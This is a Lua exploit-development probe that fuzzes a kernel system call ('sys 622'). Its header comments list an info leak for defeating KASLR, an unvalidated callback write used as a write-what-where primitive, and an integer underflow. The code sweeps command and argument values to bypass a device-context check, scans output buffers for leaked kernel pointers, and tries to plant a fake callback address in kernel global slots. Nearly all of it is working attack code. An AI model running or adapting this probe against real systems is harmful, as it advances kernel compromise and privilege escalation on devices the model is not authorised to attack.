-- CRASH_CLASS: MODERATE
-- PROBE 90a: sys 622 device context bypass — initialization + info leak + callback write
--
-- Context: Deep analysis of sys 622 (24KB device control multiplexer) reveals:
--   V6: Info leak at 0x3E30 — always copies 25 bytes regardless of name length
--        (leaks uninitialized kernel memory → potential KASLR defeat)
--   V7: Callback registration at 0x55A0 — stores function pointer to 8 global slots
--        with NO validation (write-what-where primitive for kernel globals)
--   V2: Integer underflow at 0x444C — buffer_limit < 0x18 wraps to ~0xFFFFFFFFFFFFFFE8
--
-- Probe 55c tested 400+ commands but ALL returned 0x800E0001 ("no device context").
-- This probe targets the THREE context-free paths:
--   6.16 Linked List Scanner (0x4F90): iterates GLOBAL list, not device-dependent
--   6.17 Initialization (0x5060): CREATES device entries via device_create
--   6.19 Bulk Enumeration (0x5140): enumerates ALL device types
--
-- Handler takes 6 args: cmd(r14d), sub_cmd(r15d), user_buf, copyin_src, buf_size, extra
-- Probe 55c likely used zero sub_cmd — we test sub_cmd sensitivity.
--
-- Section A: Error code mapping — find commands that return non-0x800E0001
-- Section B: Sub-cmd sensitivity — sweep sub_cmd for key command ranges
-- Section C: Initialization trigger — try commands with allocated device structures
-- Section D: Info leak harvest — if context acquired, extract leaked kernel bytes

local TEST_SECTION = TEST_SECTION or "A"

print("=== PROBE 90a: sys 622 CONTEXT BYPASS ===")
print("Section: " .. TEST_SECTION)
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

local sc622 = make_syscall(622)

-- Helper: call sys 622 with full 6 args and read error code from output buffer
local function try_622(cmd, subcmd, buf, src, bsize, extra)
    -- Zero the output buffer first
    if buf then
        for i = 0, 63 do safe_wd(buf + i * 4, 0) end
    end
    local ok, rv = pcall(function()
        return sc622(uint64(cmd), uint64(subcmd), uint64(buf or 0),
                      uint64(src or 0), uint64(bsize or 0x40), uint64(extra or 0))
    end)
    local ret_str = ok and fmt(rv) or "PCALL-FAIL"
    local err_code = buf and safe_rd(buf) or nil
    return ret_str, err_code
end

if TEST_SECTION == "A" then
    print("--- Section A: Error code mapping across command ranges ---")
    print("Looking for commands that return non-0x800E0001 (device context bypass)")
    print("")

    local outbuf = memory.alloc(0x200)

    -- 55c used zero for all args except cmd. Try with proper output buffer.
    -- Focus on ranges with NO auth: 0x200-0x270, 0x302-0x320, 0x400-0x493
    -- Also no-auth bitmap commands in 0x100-0x133

    -- No-auth commands in 0x100-0x133 range (bitmap bits = 0)
    local noauth_100 = {0x101, 0x103, 0x105, 0x108, 0x109, 0x10A, 0x10B,
                        0x10C, 0x10D, 0x10E, 0x10F, 0x11B, 0x11C, 0x11D,
                        0x12C, 0x12E, 0x12F, 0x131, 0x132, 0x133}

    print("[A1] No-auth 0x100 range commands (subcmd=0, buf allocated):")
    local interesting = {}
    for _, cmd in ipairs(noauth_100) do
        local ret, err = try_622(cmd, 0, outbuf, 0, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** DIFFERENT ***", cmd, ret, err_str))
            table.insert(interesting, cmd)
        else
            print(string.format("  cmd=0x%X: ret=%s err=%s", cmd, ret, err_str))
        end
    end
    print("")

    -- Sample commands from 0x200-0x270 (zero auth, 113 commands)
    print("[A2] 0x200-0x270 range (every 4th, subcmd=0):")
    for cmd = 0x200, 0x270, 4 do
        local ret, err = try_622(cmd, 0, outbuf, 0, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** DIFFERENT ***", cmd, ret, err_str))
            table.insert(interesting, cmd)
        end
    end
    print("")

    -- Sample commands from 0x400-0x493 (zero auth, 148 commands)
    print("[A3] 0x400-0x493 range (every 8th, subcmd=0):")
    for cmd = 0x400, 0x493, 8 do
        local ret, err = try_622(cmd, 0, outbuf, 0, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** DIFFERENT ***", cmd, ret, err_str))
            table.insert(interesting, cmd)
        end
    end
    print("")

    -- Test high command range 0x500+ that might be init/enum/global paths
    print("[A4] Extended range 0x500-0x600 (potential init/enum commands):")
    for cmd = 0x500, 0x600 do
        local ret, err = try_622(cmd, 0, outbuf, 0, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 and ret ~= "PCALL-FAIL" then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** INTERESTING ***", cmd, ret, err_str))
            table.insert(interesting, cmd)
        elseif ret == "PCALL-FAIL" then
            print(string.format("  cmd=0x%X: PCALL-FAIL", cmd))
        end
    end
    print("")

    -- Summary
    print("[A5] Commands with non-0x800E0001 errors: " .. #interesting)
    for _, cmd in ipairs(interesting) do
        print(string.format("  0x%X", cmd))
    end

    print("")
    print("[DONE] Section A complete")

elseif TEST_SECTION == "B" then
    print("--- Section B: Sub-cmd sensitivity for key commands ---")
    print("")

    local outbuf = memory.alloc(0x200)

    -- The handler reads sub-cmd from r15d (arg1). Some command paths may
    -- dispatch differently based on sub-cmd value.
    -- Test first few commands in each no-auth range with sub-cmd 1-16.

    print("[B1] cmd=0x200 with sub-cmd 0-31:")
    for subcmd = 0, 31 do
        local ret, err = try_622(0x200, subcmd, outbuf, 0, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  subcmd=%d: ret=%s err=%s *** DIFFERENT ***", subcmd, ret, err_str))
        end
    end
    print("")

    -- Test semaphore type values as sub-cmd (0x8001, 0x8002, 0x8004, 0x8008)
    -- The device lookup uses these as semaphore types
    print("[B2] Semaphore-type sub-cmds on various commands:")
    local sema_types = {0x8001, 0x8002, 0x8004, 0x8008}
    local test_cmds = {0x200, 0x201, 0x210, 0x220, 0x230, 0x240, 0x250, 0x260, 0x270}
    for _, cmd in ipairs(test_cmds) do
        for _, stype in ipairs(sema_types) do
            local ret, err = try_622(cmd, stype, outbuf, 0, 0x40, 0)
            local err_str = err and string.format("0x%X", err) or "nil"
            if err ~= 0x800E0001 then
                print(string.format("  cmd=0x%X sub=0x%X: ret=%s err=%s ***", cmd, stype, ret, err_str))
            end
        end
    end
    print("")

    -- Try with copyin_src pointing to valid buffer
    print("[B3] cmd=0x200-0x210 with copyin_src = allocated buffer:")
    local srcbuf = memory.alloc(0x100)
    for i = 0, 63 do safe_wd(srcbuf + i * 4, 0) end
    for cmd = 0x200, 0x210 do
        local ret, err = try_622(cmd, 0, outbuf, srcbuf, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X (with src): ret=%s err=%s ***", cmd, ret, err_str))
        end
    end
    print("")

    -- Try buf_size = 0 (bypass copyin entirely?)
    print("[B4] cmd=0x200-0x210 with buf_size=0:")
    for cmd = 0x200, 0x210 do
        local ret, err = try_622(cmd, 0, outbuf, 0, 0, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X (size=0): ret=%s err=%s ***", cmd, ret, err_str))
        end
    end

    print("")
    print("[DONE] Section B complete")

elseif TEST_SECTION == "C" then
    print("--- Section C: Initialization trigger attempt ---")
    print("")

    -- The initialization path at 0x5060 creates device entries.
    -- It calls device_create with specific names and dispatch tables.
    -- On failure: returns 0x800E0040. On success: calls module init.
    -- We need to find which command triggers this path.

    local outbuf = memory.alloc(0x200)
    local srcbuf = memory.alloc(0x200)

    -- Try commands in 0x300 range (31 no-auth commands 0x302-0x320)
    print("[C1] 0x302-0x320 range (no-auth, potential init commands):")
    for cmd = 0x302, 0x320 do
        local ret, err = try_622(cmd, 0, outbuf, srcbuf, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** DIFFERENT ***", cmd, ret, err_str))
        else
            print(string.format("  cmd=0x%X: ret=%s err=%s", cmd, ret, err_str))
        end
    end
    print("")

    -- Look specifically for 0x800E0040 (init failure code from analysis)
    print("[C2] Searching for init failure code 0x800E0040:")
    local found_init = false
    for cmd = 0x100, 0x520 do
        for i = 0, 63 do safe_wd(outbuf + i * 4, 0) end
        local ok, rv = pcall(function()
            return sc622(uint64(cmd), uint64(0), uint64(outbuf),
                          uint64(srcbuf), uint64(0x40), uint64(0))
        end)
        if ok then
            local err = safe_rd(outbuf)
            if err == 0x800E0040 then
                print(string.format("  cmd=0x%X: INIT FAILURE CODE 0x800E0040 ***", cmd))
                found_init = true
            end
        end
    end
    if not found_init then
        print("  No commands returned 0x800E0040")
    end
    print("")

    -- Try arg6 (extra) as a selector — some handlers read additional args from stack
    print("[C3] cmd=0x200 with extra arg (arg6) sweep:")
    for extra = 0, 15 do
        local ret, err = try_622(0x200, 0, outbuf, srcbuf, 0x40, extra)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  extra=%d: ret=%s err=%s ***", extra, ret, err_str))
        end
    end
    print("")

    -- Try with pre-populated source buffer containing device-like structures
    print("[C4] Pre-populated source buffer (device name + dispatch):")
    -- Fill source with plausible device registration data
    for i = 0, 63 do safe_wd(srcbuf + i * 4, 0) end
    -- Try writing a device type ID at offset 0
    safe_wd(srcbuf, 0x8001)      -- sema type 0x8001
    safe_wd(srcbuf + 4, 0x0001)  -- flags
    safe_wd(srcbuf + 8, 10000)   -- timeout (matches analysis: 10000)

    for cmd = 0x300, 0x320 do
        local ret, err = try_622(cmd, 0, outbuf, srcbuf, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X (struct): ret=%s err=%s ***", cmd, ret, err_str))
        end
    end

    print("")
    print("[DONE] Section C complete")

elseif TEST_SECTION == "D" then
    print("--- Section D: Info leak harvest + callback test ---")
    print("")

    local outbuf = memory.alloc(0x200)

    -- V6: Device name copy at 0x3E30 always copies 25 bytes
    -- even if name < 25 bytes. This leaks uninitialized kernel heap.
    -- If we find a command that triggers this path, check for kernel pointers.

    -- First: retry ALL commands with a large output buffer and scan for
    -- non-zero data beyond expected response size
    print("[D1] Scanning output buffers for leaked data (0x100-0x133 no-auth):")
    local noauth_100 = {0x101, 0x103, 0x105, 0x108, 0x109, 0x10A, 0x10B,
                        0x10C, 0x10D, 0x10E, 0x10F, 0x11B, 0x11C, 0x11D,
                        0x12C, 0x12E, 0x12F, 0x131, 0x132, 0x133}
    for _, cmd in ipairs(noauth_100) do
        -- Zero buffer
        for i = 0, 127 do safe_wd(outbuf + i * 4, 0) end
        local ok, rv = pcall(function()
            return sc622(uint64(cmd), uint64(0), uint64(outbuf),
                          uint64(0), uint64(0x40), uint64(0))
        end)
        if ok then
            -- Scan buffer for non-zero data after first dword
            local has_extra = false
            local extra_data = {}
            for off = 4, 0x60, 4 do
                local val = safe_rd(outbuf + off)
                if val and val ~= 0 then
                    has_extra = true
                    table.insert(extra_data, string.format("+0x%X=%X", off, val))
                end
            end
            -- Check for kernel pointers in qword-aligned reads
            for off = 0, 0x58, 8 do
                local qval = safe_rq(outbuf + off)
                if qval then
                    local h, l = get_hi_lo(qval)
                    if h >= 0xFFFF8000 then
                        print(string.format("  cmd=0x%X: KERNEL PTR at +0x%X = %s ***", cmd, off, fmt(qval)))
                    end
                end
            end
            if has_extra then
                local data_str = table.concat(extra_data, " ")
                print(string.format("  cmd=0x%X: extra data: %s", cmd, data_str))
            end
        end
    end
    print("")

    -- Try callback registration path: the analysis says 0x55A0 stores
    -- a function pointer into 8 global slots at 0x32582B0-0x32582E8.
    -- Test commands in 0x400-0x493 with various pointer-like arg patterns
    print("[D2] Callback path test (0x400-0x410 with pointer args):")
    local srcbuf = memory.alloc(0x100)
    for cmd = 0x400, 0x410 do
        -- Set up source buffer with function pointer pattern
        for i = 0, 31 do safe_wd(srcbuf + i * 4, 0) end
        safe_wd(srcbuf, 0x41414141)       -- candidate callback addr
        safe_wd(srcbuf + 4, 0x00000000)   -- high dword (userland)
        safe_wd(srcbuf + 8, 0)            -- slot index?

        local ret, err = try_622(cmd, 0, outbuf, srcbuf, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        if err ~= 0x800E0001 then
            print(string.format("  cmd=0x%X: ret=%s err=%s *** REACHED ***", cmd, ret, err_str))
        end
    end
    print("")

    -- Check the 0x3FFFFFF device access mask — try as sub-cmd
    print("[D3] Broad device access mask test (sub=0x3FFFFFF):")
    local test_cmds2 = {0x101, 0x200, 0x302, 0x400}
    for _, cmd in ipairs(test_cmds2) do
        local ret, err = try_622(cmd, 0x3FFFFFF, outbuf, srcbuf, 0x40, 0)
        local err_str = err and string.format("0x%X", err) or "nil"
        print(string.format("  cmd=0x%X sub=0x3FFFFFF: ret=%s err=%s", cmd, ret, err_str))
    end

    print("")
    print("[DONE] Section D complete")
end

print("")
print("=== PROBE 90a COMPLETE ===")
